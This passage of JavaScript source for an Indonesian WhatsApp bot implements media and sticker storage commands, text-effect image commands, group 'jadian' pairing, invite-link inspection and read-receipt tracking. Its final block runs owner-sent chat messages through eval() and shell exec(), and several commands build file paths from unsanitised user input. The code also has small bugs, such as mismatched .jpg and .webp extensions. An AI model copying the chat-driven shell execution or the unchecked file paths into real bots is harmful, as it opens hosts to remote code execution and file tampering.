									for (let awokwkwk of imagenye) {
										listimage += `📊 ${awokwkwk}\n`
										}
										listimage += `\n*TOTAL :* ${imagenye.length}`
										reply(`${listimage}`)
									break
						case 'addvideo': case 'addvid':
									if (!Ofc.key.fromMe && !isOwner && !isPremium) return reply(mess.only.prem)
									if (!isQuotedVideo) return reply('Reply Videonya Lord')
									if (!q) return reply('Nama Videonya Apa Lord?')
									let addvideo = JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
									let dellbb = await Zeeone.downloadMediaMessage(addvideo)
									videonye.push(q)
									fs.writeFileSync(`./database/video/${q}.jpg`, dellbb)
									fs.writeFileSync('./database/video.json', JSON.stringify(videonye))
									reply(`Sukses Menambahkan Video!\nCek Video Dengan Cara Ketik ${prefix}listvideo`)
									break
						case 'delvideo': case 'deletevideo':
									if (!Ofc.key.fromMe && !isOwner  && !isPremium) return reply(mess.only.prem)
									if (!q) return reply(`Nama Video Yang Mau Di Hapus Apa Lord?`)
									try {
										fs.unlinkSync(`./database/video/${q}.webp`)
										let delvideo = videonye.indexOf(q)
										videonye.splice(delvideo, 1)
										fs.writeFileSync('./database/video.json', JSON.stringify(videonye))
										reply(`Succes Menghapus Video ${q}!`)
										await sleep(5000)
										} catch (err) {
											reply(`Gagal Menghapus Video ${q}!`)
										}
									break
						case 'listvideo': case 'listvid':  
									let listvideo = '*『 LIST VIDEO 』*\n\n'
									for (let awokwkwk of videonye) {
										listvideo += `📊 ${awokwkwk}\n`
										}
										listvideo += `\n*TOTAL :* ${videonye.length}`
										reply(`${listvideo}`)
									break
						case 'addstik': case 'addstiker': case 'addsticker':
									if (!Ofc.key.fromMe && !isOwner && !isPremium) return reply(mess.only.prem)
									if (!isQuotedSticker) return reply('Reply stiker nya Lord')
									if (!q) return reply('Nama Sticker Nya Apa Lord?')
									let addstik = JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
									let delbb = await Zeeone.downloadMediaMessage(addstik)
									setiker.push(q)
									fs.writeFileSync(`./database/stick/${q}.webp`, delbb)
									fs.writeFileSync('./database/stick.json', JSON.stringify(setiker))
									reply(`Sukses Menambahkan Sticker!!\nCek Sticker Dengan Cara Ketik ${prefix}liststick`)
									break
						case 'delstik': case 'delstick': case 'delsticker': case 'delstiker':
									if (!Ofc.key.fromMe && !isOwner  && !isPremium) return reply(mess.only.prem)
									if (!q) return reply(`Nama Sticker Yang Mau Di Hapus Apa Lord?`)
									try {
										fs.unlinkSync(`./database/stick/${q}.webp`)
										let delstik = setiker.indexOf(q)
										setiker.splice(delstik, 1)
										fs.writeFileSync('./database/stick.json', JSON.stringify(setiker))
										reply(`Succes Menghapus sticker ${q}!`)
										await sleep(5000)
										} catch (err) {
											reply(`Gagal Menghapus sticker ${q}!`)
										}
									break
						case 'liststik': case 'liststicker': case 'liststiker': case 'liststick':
									liststik = '*『 LIST STICKER 』*\n\n'
									for (let awokwkwk of setiker) {
										liststik += `📊 ${awokwkwk}\n`
										}
										liststik += `\n*TOTAL :* ${setiker.length}`
										reply(`${liststik}`)
									break
						case 'addrespon': case 'addres':
									if (!isPremium && !isOwner && !Ofc.key.fromMe) return reply(mess.only.prem)
									 if (args.length < 1) return reply(`Kirim perintah ${command} command|jawaban`)
									var soal = q.split('|')[0]
									var jawaban = q.split('|')[1]
									if (!jawaban) return reply(`Jawabannya apa?`)
									if (checkCommands(soal.toLowerCase(), cmdDB)) return reply(`Command tersebut sudah ada!`)
									addCommands(soal.toLowerCase(), jawaban, sender, cmdDB)
									reply('Sukses!')
									break
						case 'deleterespon': case 'dellrespon': case 'delrespon': 
									if (!isPremium && !Ofc.key.fromMe) return reply(mess.only.prem)
									if (args.length < 1) return reply(`Kirim perintah ${command} list respon`)
									if (isCreated(q.toLowerCase(), sender, cmdDB) && !isOwner) return reply(`Anda bukan pembuat command!`)
									deleteCommands(q.toLowerCase(), cmdDB)
									reply('Sukses Lord')
									break
						case 'listrespon': case 'listres':
									if (!isOwner && !Ofc.key.fromMe) return
									var txtt = `LIST REPONSE\nJumlah : *${cmdDB.length}*\n\n`
									for (let i of cmdDB){
										txtt += `*Respon :* ${i.commands}\n*Jawaban :* ${i.jawaban}\n*Created :* @${i.created.split("@")[0]}\n\n`
										}
										Zeeone.sendMessage(`${ownerNumber}`, txtt, text, { quoted: Ofc, contextInfo:{ mentionedJid: parseMention(txtt) }})
										break
						case 'chatinfo': case 'sider':{
									if (!isGroup) return reply(mess.only.group)
									infom = await Zeeone.messageInfo(from, Ofc.message.extendedTextMessage.contextInfo.stanzaId)
									hemm = infom.reads
									hemms = infom.deliveries
									readon = hemms.map(v => v.jid)
									readdin = hemm.map(v => v.jid)
									stamp = hemm.map(v => v.t)
									function toTime(UNIXtimestamp, ribuan) {
										ribuan = (typeof ribuan == 'undefined') ? false : true;
										let a = new Date(UNIXtimestamp);
										if (ribuan) {
											a = new Date(UNIXtimestamp * 1000);
											}
											var hour = a.getHours();
											var min = a.getMinutes();
											var sec = a.getSeconds();
											var time = `${hour}:${min}:${sec}`;
											return time;
										}

										function toBulan(UNIXtimestamp, ribuan) {
											ribuan = (typeof ribuan == 'undefined') ? false : true;
											let a = new Date(UNIXtimestamp);
											if (ribuan) {
												a = new Date(UNIXtimestamp * 1000);
												}
												var months = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember'];
												var myDays = ['Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jum at', 'Sabtu'];
												var day = a.getDate()
												bulanee = a.getMonth()
												var thisDay = a.getDay(),
												thisDay = myDays[thisDay];
												var yy = a.getYear()
												var year = (yy < 1000) ? yy + 1900 : yy;
												var bul = `${thisDay}, ${day} - ${months[bulanee]} - ${year}`;
												return bul;
												}
												teksx = `『 *TELAH DIBACA* 』\n\n`
												for (let i of hemm) {
													teksx += `📛 Nama : @${i.jid.split('@')[0]}\n⏰ Waktu : ${toTime(i.t, true)}\n📅 Tanggal : ${toBulan(i.t, true)}\n\n`
													}
												teksx1 = `『 *BELUM DIBACA* 』\n\n`
												for (let i of hemms) {
													teksx1 += `📛 Nama : @${i.jid.split('@')[0]}\n`
													teksx1 += `⏰ Waktu : ${toTime(i.t, true)}\n📅 Tanggal : ${toBulan(i.t, true)}\n\n`
													}
												Zeeone.sendMessage(from, teksx, text, { sendEphemeral: false, quoted: Ofc, thumbnail: thumbnail, contextInfo: { forwardingScore: 999, isForwarded: false, mentionedJid: readdin } })
												Zeeone.sendMessage(from, teksx1, text, { sendEphemeral: false, quoted: Ofc, thumbnail: thumbnail, contextInfo: { forwardingScore: 999, isForwarded: false, mentionedJid: readon } })
												}
												break
						case 'jadian':
									if (!isGroup) return reply(mess.only.group)
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									jds = []
									const A11 = groupMembers
									const B11 = groupMembers
									const C11 = A11[Math.floor(Math.random() * A11.length)] 
									const C22 = B11[Math.floor(Math.random() * B11.length)]
									D11 = `*『 JADIAN 』*\n\n@${C11.jid.split('@')[0]} ❤ @${C22.jid.split('@')[0]}\n\nMogaa Langgeng 😘`  
									jds.push(C11.jid)
									jds.push(C22.jid)
									mentions(D11, jds, true)
									await limitAdd(sender, limit)
									break
						case 'naruto':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pNaruto(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url, q)
										})
									break
						case 'shadow':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pShadow(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
									})
									break
						case 'romantic':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pRomantic(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
										})
									break
						case 'smoke':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pSmoke(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
									})
									break
						case 'burnpaper':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pBurnPapper(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
										})
									break
						case 'lovemsg':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pLoveMsg(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
										})
									break
						case 'grass':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pMsgGrass(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
										})
									break
						case 'doubleheart':
									if (!q) return reply('teksnya Lord?')
									reply(mess.wait)
									pDoubleHeart(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
										})
									break
						case 'coffecup':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pCoffeCup(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
									})
									break
						case 'lovetext':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pLoveText(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
									})
									break
						case 'butterfly':
									if (!q) return reply('Teksnya Lord?')
									reply(mess.wait)
									pButterfly(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
										})
									break
						case 'styletext': case 'textstyle':
									reply(Object.entries(await styleText(q)).map(([name, value]) => `_${name}_ : ${value}`).join`\n\n`)
									break
						case 'inspect':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									try {
										let linkRegex = /chat\.whatsapp\.com\/(?:invite\/)?([0-9A-Za-z]{20,24})/i
										let [, code] = q.match(linkRegex) || []
										if (!code) throw 'Link invalid'
										res = await Zeeone.query({json: ["query", "invite", code],
										expect200: true})
										caption = `『 *GROUP LINK INSPECTOR* 』 
										
🔖 Nama Grup : ${res.subject}
🔖 Terakhir di ubah oleh : @${res.subjectOwner.replace("@c.us","")}
🔖 Di Ubah Pada ${formatDate(res.subjectTime * 1000)}

🔖 ID : ${res.id}
🔖 Di Buat Oleh : @${res.id.split('-')[0]}
🔖 Di Buat pada ${formatDate(res.creation * 1000)}

🔖Edit info grup : ${res.restrict?`Hanya admin`:`Semua peserta`}
🔖Kirim pesan : ${res.announce?`Hanya admin`:`Semua peserta`}
🔖Pesan sementara : ${res.ephemeralDuration?`Aktif`:`mati`}
🔖Jumlah Member : ${res.size}
🔖Member Yang Diketahui : ${res.participants ? '\n│ *' + res.participants.map((user, i) => ++i + '. @' + user.id.split`@`[0]+'*').join('\n│ *').trim() : 'Gada'}
🔖Deskripsi :*
${res.desc ? `${res.desc}` : 'Gada'}
🔖Terakhir di ubah oleh : @${res.descOwner.replace("@c.us","")}*
🔖Di ubah pada ${formatDate(res.descTime * 1000)}`
									try {
										profilePic = await Zeeone.getProfilePicture(res.id)
										} catch {
											profilePic = `${imagebb}`
											}
											anay = await getBuffer(profilePic)
											Zeeone.sendMessage(from, anay, image, {quoted: Ofc, thumbnail: thumbnail, caption: caption, contextInfo: {
												mentionedJid: Zeeone.parseMention(caption)
												}})
												} catch (e) {
													reply(`${e}`)
													}
												limitAdd(sender, limit)
												break
												default:
		if(budy.includes("@verif", "@verify","daftar")){
			if (isUser) return reply('Kamu sudah terdaftar di dalam database')
 addRegisterUser(sender, pushname, bio_user, wib)
 let ran_blc = randomNomor(50)
 addBalance(sender, ran_blc, balance)
fs.writeFileSync('./database/user.json', JSON.stringify(_user))
teks = `╭─❒ *Verification* ❒\n│📛 *Nama :* ${pushname}\n│#️⃣ *Nomor :* @${sender.split('@')[0]}\n│💌 *Bio :* ${bio_user}\n│⏰ *Time :* ${wib} Wib\n╰❒ *Success*`
let papako = [{
										"buttonId": `menu`,
										"buttonText": {
											"displayText": "MENU"
											},
										"type": "RESPONSE"
										},{
										"buttonId": `me`,
										"buttonText": {
											"displayText": "PROCFILE"
											},
										"type": "RESPONSE"
										}]
								sendButLocation(from, teks , `Thank for verification 💋\n${botname}™© | By ${ownername}`, thumbnail, papako, {contextInfo: { mentionedJid: [sender]}})
                }
		
if (budy.startsWith('x')){
try {
if (!Ofc.key.fromMe && !isOwner && !isCreator) return reply(mess.only.owner)
return Zeeone.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: Ofc})
} catch(err) {
e = String(err)
reply(e)
}
}  
if (budy.startsWith('>')){
try {
	if (!Ofc.key.fromMe && !isOwner && !isCreator) return reply(mess.only.owner)
return Zeeone.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: Ofc})
} catch(err) {
e = String(err)
reply(e)
}
}  
if (budy.startsWith('$')){
if (!Ofc.key.fromMe && !isOwner && !isCreator ) return reply(mess.only.owner)
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`LordUserbot :~ ${err}`)
if (stdout) {
reply(stdout)
}
})
}
if (budy.startsWith('=>')){
if (!Ofc.key.fromMe && !isOwner && !isCreator) return reply(mess.only.owner)
var konsol = budy.slice(3)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`;(async () => { ${konsol} })()`)))
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color("=>", "green"), 'from', color(pushname), 'args :', color(args.length))
} catch(e){
reply(String(e))
}
}
	}
if (isGroup && budy != undefined) {
	} else {
	console.log(color('[ PRIVATE ]', 'aqua'), wib, color(pushname))
	}		
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero")) {
	console.log('Message : %s', color(e, 'green'))
        }
	// console.log(e)
	}
}
